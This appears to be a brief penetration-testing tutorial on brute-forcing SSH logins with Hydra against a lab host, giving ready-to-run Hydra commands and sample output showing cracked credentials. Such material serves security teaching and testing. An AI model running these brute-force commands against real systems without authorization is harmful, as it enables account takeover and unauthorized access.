# Password Attack – Online Brute Force with Hydra

## Vulnerability
The target system exposes a network authentication service without effective protections such as
account lockout, rate limiting, or CAPTCHA.  
This allows an attacker to perform an **online password brute-force attack** using automated tools like Hydra.

---

## Tool
Hydra is a fast network login cracker that supports many protocols such as SSH, FTP, HTTP, SMB, and others.

---

## Target Scenario
- Service: SSH
- Authentication: Username + Password
- Protection: No lockout / no rate limiting
- Attacker has:
  - A known username
  - A password wordlist

---

## Basic Hydra Syntax
```bash
hydra -l <username> -P <password_list> <service>://<target>
```

### Example 1 — SSH Brute Force for a Local User
```bash
hydra -l testuser -P rockyou.txt ssh://192.168.56.101

[22][ssh] host: 192.168.56.101   login: testuser   password: password123
1 of 1 target successfully completed, 1 valid password found
```
Hydra attempts multiple password guesses for the same user until valid credentials are found.

### Example 2 — Limiting Attempts and Threads

```bash
hydra -l testuser -P rockyou.txt -t 4 -f ssh://192.168.56.101
```
-t 4 → limits parallel connections
-f → stop after first valid password is found

### Example 3 — Multiple Users
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.56.101

[ATTEMPT] target 192.168.56.101 - login "testuser" - pass "123456"
[ATTEMPT] target 192.168.56.101 - login "testuser" - pass "password"
[22][ssh] host: 192.168.56.101   login: testuser   password: letmein
```


Notes

This is an online attack: each attempt is sent to the target service.
Speed is limited by network latency and service response time.
Logs on the target system may record failed login attempts.